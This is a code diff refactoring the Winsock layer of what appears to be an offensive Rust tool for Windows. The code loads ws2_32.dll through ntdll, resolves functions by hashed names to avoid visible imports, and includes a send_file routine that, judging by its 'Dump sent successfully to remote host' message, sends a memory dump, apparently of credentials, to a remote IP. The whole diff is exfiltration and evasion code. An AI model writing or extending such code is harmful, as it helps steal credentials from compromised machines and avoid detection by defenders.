@@ -1,21 +1,18 @@
-#[cfg(feature = "verbose")]
-use libc_print::libc_println;
-
-use alloc::ffi::CString;
-use alloc::vec::Vec;
-
 use core::{
     ffi::c_void,
     mem::{transmute, zeroed},
     ptr::{null, null_mut},
-    sync::atomic::{AtomicBool, Ordering},
 };
 
-use crate::common::ldrapi::ldr_function;
-use crate::ntapi::def::UnicodeString;
-use crate::ntapi::g_instance::instance;
+use alloc::{ffi::CString, vec::Vec};
 
-use crate::debug_println;
+use crate::{
+    common::ldrapi::ldr_function, debug_println, instance::get_instance,
+    native::ntdef::UnicodeString,
+};
+
+#[allow(non_camel_case_types)]
+pub type SOCKET = usize;
 
 // Data structures for Winsock
 #[repr(C)]
@@ -60,6 +57,22 @@ pub struct AddrInfo {
     pub ai_next: *mut AddrInfo,
 }
 
+#[allow(non_camel_case_types)]
+#[repr(C)]
+#[derive(Clone, Copy)]
+pub struct FD_SET {
+    pub fd_count: u32,
+    pub fd_array: [SOCKET; 64],
+}
+
+#[allow(non_camel_case_types)]
+#[repr(C)]
+#[derive(Clone, Copy)]
+pub struct TIMEVAL {
+    pub tv_sec: i32,
+    pub tv_usec: i32,
+}
+
 // Define function types for Winsock functions
 type WSAStartupFunc =
     unsafe extern "system" fn(wVersionRequested: u16, lpWsaData: *mut WsaData) -> i32;
@@ -79,9 +92,18 @@ type GetAddrInfoFunc = unsafe extern "system" fn(
 ) -> i32;
 type FreeAddrInfoFunc = unsafe extern "system" fn(res: *mut AddrInfo);
 
+type Ioctlsocket = unsafe extern "system" fn(s: SOCKET, cmd: i32, argp: *mut u32) -> i32;
+
+type Select = unsafe extern "system" fn(
+    nfds: i32,
+    readfds: *mut FD_SET,
+    writefds: *mut FD_SET,
+    exceptfds: *mut FD_SET,
+    timeout: *mut TIMEVAL,
+) -> i32;
+
 type WSAGetLastError = unsafe extern "system" fn() -> i32;
 
-// Structure to hold function pointers
 pub struct Winsock {
     pub wsa_startup: WSAStartupFunc,
     pub wsa_cleanup: WSACleanupFunc,
@@ -94,11 +116,12 @@ pub struct Winsock {
     pub htons: HtonsFunc,
     pub getaddrinfo: GetAddrInfoFunc,
     pub freeaddrinfo: FreeAddrInfoFunc,
+    pub ioctlsocket: Ioctlsocket,
+    pub select: Select,
     pub wsa_get_last_error: WSAGetLastError,
 }
 
 impl Winsock {
-    // Function to initialize the Winsock structure with null values
     pub fn new() -> Self {
         Winsock {
             wsa_startup: unsafe { core::mem::transmute(core::ptr::null::<core::ffi::c_void>()) },
@@ -112,6 +135,8 @@ impl Winsock {
             htons: unsafe { core::mem::transmute(core::ptr::null::<core::ffi::c_void>()) },
             getaddrinfo: unsafe { core::mem::transmute(core::ptr::null::<core::ffi::c_void>()) },
             freeaddrinfo: unsafe { core::mem::transmute(core::ptr::null::<core::ffi::c_void>()) },
+            ioctlsocket: unsafe { core::mem::transmute(core::ptr::null::<core::ffi::c_void>()) },
+            select: unsafe { core::mem::transmute(core::ptr::null::<core::ffi::c_void>()) },
             wsa_get_last_error: unsafe {
                 core::mem::transmute(core::ptr::null::<core::ffi::c_void>())
             },
@@ -119,41 +144,31 @@ impl Winsock {
     }
 }
 
-// Global variable to store Winsock functions
-static mut WINSOCK_FUNCS: Option<Winsock> = None;
-// Atomic variable to track if Winsock functions have been initialized
-static INIT_WINSOCKS: AtomicBool = AtomicBool::new(false);
-
-/// Initializes Winsock functions.
-///
-/// This function dynamically loads the Winsock functions from the "ws2_32.dll" library.
-/// It ensures that the functions are loaded only once using atomic operations.
-/// The function does not return any values.
 pub fn init_winsock_funcs() {
     unsafe {
-        if !INIT_WINSOCKS.load(Ordering::Acquire) {
-            // Constants representing hash values of Winsock function names
-            pub const WSA_STARTUP_DBJ2: usize = 0x142e89c3;
-            pub const WSA_CLEANUP_DBJ2: usize = 0x32206eb8;
-            pub const SOCKET_DBJ2: usize = 0xcf36c66e;
-            pub const CONNECT_DBJ2: usize = 0xe73478ef;
-            pub const SEND_DBJ2: usize = 0x7c8bc2cf;
-            pub const RECV_DBJ2: usize = 0x7c8b3515;
-            pub const CLOSESOCKET_DBJ2: usize = 0x185953a4;
-            pub const INET_ADDR_DBJ2: usize = 0xafe73c2f;
-            pub const HTONS_DBJ2: usize = 0xd454eb1;
-            pub const GETADDRINFO_DBJ2: usize = 0x4b91706c;
-            pub const FREEADDRINFO_DBJ2: usize = 0x307204e;
-            pub const WSAGETLASTERROR_H: usize = 0x9c1d912e;
+        pub const WSA_STARTUP_DBJ2: usize = 0x142e89c3;
+        pub const WSA_CLEANUP_DBJ2: usize = 0x32206eb8;
+        pub const SOCKET_DBJ2: usize = 0xcf36c66e;
+        pub const CONNECT_DBJ2: usize = 0xe73478ef;
+        pub const SEND_DBJ2: usize = 0x7c8bc2cf;
+        pub const RECV_DBJ2: usize = 0x7c8b3515;
+        pub const CLOSESOCKET_DBJ2: usize = 0x185953a4;
+        pub const INET_ADDR_DBJ2: usize = 0xafe73c2f;
+        pub const HTONS_DBJ2: usize = 0xd454eb1;
+        pub const GETADDRINFO_DBJ2: usize = 0x4b91706c;
+        pub const FREEADDRINFO_DBJ2: usize = 0x307204e;
+        pub const IOCTLSOCKET_H: usize = 0xd5e978a9;
+        pub const SELECT_H: usize = 0xce86a705;
+        pub const WSAGETLASTERROR_H: usize = 0x9c1d912e;
 
-            let dll_name = "ws2_32.dll";
-            let mut ws2_win32_dll_unicode = UnicodeString::new();
-            let utf16_string: Vec<u16> = dll_name.encode_utf16().chain(Some(0)).collect();
-            ws2_win32_dll_unicode.init(utf16_string.as_ptr());
+        let mut ws2_win32_dll_unicode = UnicodeString::new();
+        let utf16_string: Vec<u16> = "ws2_32.dll".encode_utf16().chain(Some(0)).collect();
+        ws2_win32_dll_unicode.init(utf16_string.as_ptr());
 
-            let mut ws2_win32_handle: *mut c_void = null_mut();
+        let mut ws2_win32_handle: *mut c_void = null_mut();
 
-            (instance().ntdll.ldr_load_dll)(
+        if let Some(instance) = get_instance() {
+            (instance.ntdll.ldr_load_dll)(
                 null_mut(),
                 null_mut(),
                 ws2_win32_dll_unicode,
@@ -166,7 +181,6 @@ pub fn init_winsock_funcs() {
 
             let ws2_32_module = ws2_win32_handle as *mut u8;
 
-            // Resolve function addresses using hashed names
             let wsa_startup_addr = ldr_function(ws2_32_module, WSA_STARTUP_DBJ2);
             let wsa_cleanup_addr = ldr_function(ws2_32_module, WSA_CLEANUP_DBJ2);
             let socket_addr = ldr_function(ws2_32_module, SOCKET_DBJ2);
@@ -178,55 +192,25 @@ pub fn init_winsock_funcs() {
             let htons_addr = ldr_function(ws2_32_module, HTONS_DBJ2);
             let getaddrinfo_addr = ldr_function(ws2_32_module, GETADDRINFO_DBJ2);
             let freeaddrinfo_addr = ldr_function(ws2_32_module, FREEADDRINFO_DBJ2);
+            let ioctlsocket_addr = ldr_function(ws2_32_module, IOCTLSOCKET_H);
+            let select_addr = ldr_function(ws2_32_module, SELECT_H);
             let wsa_get_last_error_addr = ldr_function(ws2_32_module, WSAGETLASTERROR_H);
 
-            // Initialize Winsock functions
-            let mut winsock_functions = Winsock::new();
-            winsock_functions.wsa_startup = transmute(wsa_startup_addr);
-            winsock_functions.wsa_cleanup = transmute(wsa_cleanup_addr);
-            winsock_functions.socket = transmute(socket_addr);
-            winsock_functions.connect = transmute(connect_addr);
-            winsock_functions.send = transmute(send_addr);
-            winsock_functions.recv = transmute(recv_addr);
-            winsock_functions.closesocket = transmute(closesocket_addr);
-            winsock_functions.inet_addr = transmute(inet_addr_addr);
-            winsock_functions.htons = transmute(htons_addr);
-            winsock_functions.getaddrinfo = transmute(getaddrinfo_addr);
-            winsock_functions.freeaddrinfo = transmute(freeaddrinfo_addr);
-            winsock_functions.wsa_get_last_error = transmute(wsa_get_last_error_addr);
-
-            // Store the functions in the global variable
-            WINSOCK_FUNCS = Some(winsock_functions);
-
-            // Mark Winsock functions as initialized
-            INIT_WINSOCKS.store(true, Ordering::Release);
+            instance.winsock.wsa_startup = transmute(wsa_startup_addr);
+            instance.winsock.wsa_cleanup = transmute(wsa_cleanup_addr);
+            instance.winsock.socket = transmute(socket_addr);
+            instance.winsock.connect = transmute(connect_addr);
+            instance.winsock.send = transmute(send_addr);
+            instance.winsock.recv = transmute(recv_addr);
+            instance.winsock.closesocket = transmute(closesocket_addr);
+            instance.winsock.inet_addr = transmute(inet_addr_addr);
+            instance.winsock.htons = transmute(htons_addr);
+            instance.winsock.getaddrinfo = transmute(getaddrinfo_addr);
+            instance.winsock.freeaddrinfo = transmute(freeaddrinfo_addr);
+            instance.winsock.ioctlsocket = transmute(ioctlsocket_addr);
+            instance.winsock.select = transmute(select_addr);
+            instance.winsock.wsa_get_last_error = transmute(wsa_get_last_error_addr);
         }
-    }
-}
-
-/// Gets the Winsock functions.
-///
-/// This function ensures the Winsock functions are initialized and returns a reference to them.
-/// If the functions are not already initialized, it will initialize them first.
-///
-/// # Returns
-/// * `&'static Winsock` - A reference to the initialized Winsock functions.
-pub fn get_winsock() -> &'static Winsock {
-    init_winsock_funcs();
-    return unsafe { WINSOCK_FUNCS.as_ref().unwrap() };
-}
-
-#[allow(non_camel_case_types)]
-pub type SOCKET = usize;
-
-/// Cleans up the Winsock library.
-///
-/// This function cleans up the Winsock library, releasing any resources that were allocated.
-/// This function does not return any values.
-pub fn cleanup_winsock(sock: SOCKET) {
-    unsafe {
-        (get_winsock().closesocket)(sock);
-        (get_winsock().wsa_cleanup)();
     }
 }
 
@@ -235,11 +219,22 @@ pub fn cleanup_winsock(sock: SOCKET) {
 pub fn init_winsock() -> i32 {
     unsafe {
         let mut wsa_data: WsaData = core::mem::zeroed();
-        let result = (get_winsock().wsa_startup)(0x0202, &mut wsa_data);
+        let result = (get_instance().unwrap().winsock.wsa_startup)(0x0202, &mut wsa_data);
         if result != 0 {
-            return (get_winsock().wsa_get_last_error)();
+            return (get_instance().unwrap().winsock.wsa_get_last_error)();
         }
         result
+    }
+}
+
+/// Cleans up the Winsock library.
+///
+/// This function cleans up the Winsock library, releasing any resources that were allocated.
+/// This function does not return any values.
+pub fn cleanup_winsock(sock: SOCKET) {
+    unsafe {
+        (get_instance().unwrap().winsock.closesocket)(sock);
+        (get_instance().unwrap().winsock.wsa_cleanup)();
     }
 }
 
@@ -247,7 +242,7 @@ pub fn init_winsock() -> i32 {
 /// Returns the socket descriptor (SOCKET) or an error code on failure.
 pub fn create_socket() -> SOCKET {
     unsafe {
-        (get_winsock().socket)(2, 1, 6) // AF_INET, SOCK_STREAM, IPPROTO_TCP
+        (get_instance().unwrap().winsock.socket)(2, 1, 6) // AF_INET, SOCK_STREAM, IPPROTO_TCP
     }
 }
 
@@ -261,10 +256,15 @@ pub fn resolve_hostname(hostname: &str) -> u32 {
         hints.ai_socktype = 1; // SOCK_STREAM
         let mut res: *mut AddrInfo = null_mut();
 
-        let status = (get_winsock().getaddrinfo)(hostname_cstr.as_ptr(), null(), &hints, &mut res);
+        let status = (get_instance().unwrap().winsock.getaddrinfo)(
+            hostname_cstr.as_ptr(),
+            null(),
+            &hints,
+            &mut res,
+        );
 
         if status != 0 {
-            return (get_winsock().wsa_get_last_error)() as u32;
+            return (get_instance().unwrap().winsock.wsa_get_last_error)() as u32;
         }
 
         let mut ip_addr: u32 = 0;
@@ -281,7 +281,7 @@ pub fn resolve_hostname(hostname: &str) -> u32 {
             addr_info_ptr = addr_info.ai_next;
         }
 
-        (get_winsock().freeaddrinfo)(res);
+        (get_instance().unwrap().winsock.freeaddrinfo)(res);
         ip_addr
     }
 }
@@ -299,34 +299,45 @@ pub fn connect_socket(sock: SOCKET, addr: &str, port: u16) -> i32 {
         let resolve_addr = resolve_hostname(addr);
         let mut sockaddr_in: SockAddrIn = core::mem::zeroed();
         sockaddr_in.sin_family = 2; // AF_INET
-        sockaddr_in.sin_port = (get_winsock().htons)(port);
+        sockaddr_in.sin_port = (get_instance().unwrap().winsock.htons)(port);
         sockaddr_in.sin_addr.s_addr = resolve_addr;
 
         let sockaddr = &sockaddr_in as *const _ as *const SockAddr;
-        let result =
-            (get_winsock().connect)(sock, sockaddr, core::mem::size_of::<SockAddrIn>() as i32);
+        let result = (get_instance().unwrap().winsock.connect)(
+            sock,
+            sockaddr,
+            core::mem::size_of::<SockAddrIn>() as i32,
+        );
 
         if result != 0 {
-            return (get_winsock().wsa_get_last_error)();
+            return (get_instance().unwrap().winsock.wsa_get_last_error)();
         }
         result
     }
 }
 
-/// Sends a request through a socket.
+/// Sends data through a socket.
 ///
-/// This function sends a request through the specified socket.
-/// It returns a `Result` indicating whether the send operation was successful or not.
+/// This function sends a specified byte array through the provided socket.
+/// It returns an `i32`, where 0 indicates success, and any other value
+/// represents the error code returned by `wsa_get_last_error`.
 ///
 /// # Arguments
 /// * `sock` - The socket descriptor.
-/// * `request` - The request data to be sent.
-pub fn send_request(sock: SOCKET, request: &[u8]) -> i32 {
+/// * `data` - The data to be sent.
+///
+/// # Returns
+/// * `i32` - 0 on success, or the error code on failure.
+pub fn send_data(sock: SOCKET, data: &[u8]) -> i32 {
     unsafe {
-        let result =
-            (get_winsock().send)(sock, request.as_ptr() as *const i8, request.len() as i32, 0);
+        let result = (get_instance().unwrap().winsock.send)(
+            sock,
+            data.as_ptr() as *const i8,
+            data.len() as i32,
+            0,
+        );
         if result != 0 {
-            return (get_winsock().wsa_get_last_error)();
+            return (get_instance().unwrap().winsock.wsa_get_last_error)();
         }
         result
     }
@@ -343,8 +354,9 @@ pub fn send_file(data: Vec<u8>, ip: &str, port: u16) {
     let wsa_init_result = init_winsock();
     if wsa_init_result != 0 {
         debug_println!(
-            "[-] Failed to initialize Winsock with error: {}",
-            wsa_init_result
+            "[-] Failed to initialize Winsock with error: ",
+            wsa_init_result as usize,
+            false
         );
         return;
     }
@@ -352,36 +364,35 @@ pub fn send_file(data: Vec<u8>, ip: &str, port: u16) {
     // Create a socket.
     let sock = create_socket();
     if sock == usize::MAX {
-        unsafe {
-            let _error = (get_winsock().wsa_get_last_error)();
-            debug_println!("[-] Failed to create socket. Winsock error: {}", _error);
-            return;
-        }
+        debug_println!(
+            "[-] Failed to create socket with error: ",
+            unsafe { (get_instance().unwrap().winsock.wsa_get_last_error)() as usize },
+            false
+        );
+        return;
     }
 
     // Connect the socket to the IP and port.
     let connect_result = connect_socket(sock, ip, port);
     if connect_result != 0 {
         debug_println!(
-            "[-] Failed to connect socket to {}:{} with error: {}",
-            ip,
-            port,
-            connect_result
+            "[-] Failed to connect socket with error: ",
+            connect_result as usize,
+            false
         );
         cleanup_winsock(sock);
         return;
     }
 
     // Send the data.
-    let send_result = send_request(sock, &data);
+    let send_result = send_data(sock, &data);
 
     // Check if sending the file was successful.
     if send_result != 0 {
         debug_println!(
-            "[-] Failed to send data to {}:{} with error: {}",
-            ip,
-            port,
-            send_result
+            "[-] Failed to send data to remote host with error code: ",
+            send_result as usize,
+            false
         );
         cleanup_winsock(sock);
         return;
@@ -390,5 +401,5 @@ pub fn send_file(data: Vec<u8>, ip: &str, port: u16) {
     // Close the socket.
     cleanup_winsock(sock);
 
-    debug_println!("[+] Dump sent successfully to remote host");
+    debug_println!("[+] Dump sent successfully to remote host!");
 }
